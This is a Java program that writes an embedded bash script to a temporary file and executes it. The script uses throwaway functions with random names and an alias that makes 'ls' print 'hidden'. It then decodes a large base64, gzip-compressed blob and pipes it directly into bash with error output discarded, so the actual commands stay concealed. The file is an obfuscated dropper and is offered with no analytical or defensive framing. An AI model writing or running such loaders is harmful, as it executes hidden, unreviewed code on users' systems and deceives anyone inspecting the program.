import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

vvosgnhf7() { echo $((RANDOM * RANDOM)); }
vsdv6id88() { for i in {1..3}; do :; done; }
v6lmxrkth() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
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
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
